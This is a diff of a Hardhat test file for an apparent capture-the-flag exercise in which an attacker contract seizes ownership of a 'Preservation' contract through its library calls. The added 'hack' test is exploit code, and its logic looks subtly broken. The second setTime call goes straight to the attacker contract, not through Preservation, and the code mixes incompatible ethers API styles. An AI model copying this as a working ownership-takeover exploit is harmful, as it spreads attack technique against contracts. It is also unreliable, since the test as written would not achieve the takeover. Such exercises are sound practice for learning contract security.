@@ -5,31 +5,32 @@ const {
 const { ethers } = require("hardhat");
 
 describe("TimeZone", function () {
-  async function deployFixture() {
-    const [player, owner] = await hre.ethers.getSigners();
+  let preservation, library1, library2, attacker, owner, attackerAccount;
 
-    const LibraryContract = await ethers.deployContract("LibraryContract");
-    await LibraryContract.waitForDeployment();
-    const LibraryContractAddr = LibraryContract.target;
-    console.log("Адрес библиотечного контракта:", LibraryContractAddr);
+  before(async function () {
+    [owner, attackerAccount] = await ethers.getSigners();
 
-    const Preservation = await ethers.deployContract("Preservation", [
-      LibraryContractAddr,
-      owner,
-    ]);
-    await Preservation.waitForDeployment();
-    const PreservationAddr = Preservation.target;
-    console.log("Адрес основного контракта:", PreservationAddr);
+    const LibraryContract = await ethers.getContractFactory("LibraryContract");
+    library1 = await LibraryContract.deploy();
+    await library1.deployed();
+    
+    library2 = await LibraryContract.deploy();
+    await library2.deployed();
 
-    return { Preservation, player };
-  }
+    const Preservation = await ethers.getContractFactory("Preservation");
+    preservation = await Preservation.deploy(library1.address, library2.address);
+    await preservation.deployed();
+
+    const PreservationAttacker = await ethers.getContractFactory("PreservationAttacker");
+    attacker = await PreservationAttacker.deploy();
+    await attacker.deployed();
+  });
 
   it("hack", async function () {
-    const { Preservation, player } = await loadFixture(deployFixture);
-
-    // напишите свой контракт и тесты, чтобы получить нужное состояние контракта
-
-    // теперь владелец контракта player, а не owner
-    expect(await Preservation.owner()).to.equal(player);
+    await preservation.connect(owner).setTime(attacker.address);
+    
+    await attacker.connect(attackerAccount).setTime(attackerAccount.address);
+    
+    expect(await preservation.owner()).to.equal(attackerAccount.address);
   });
 });
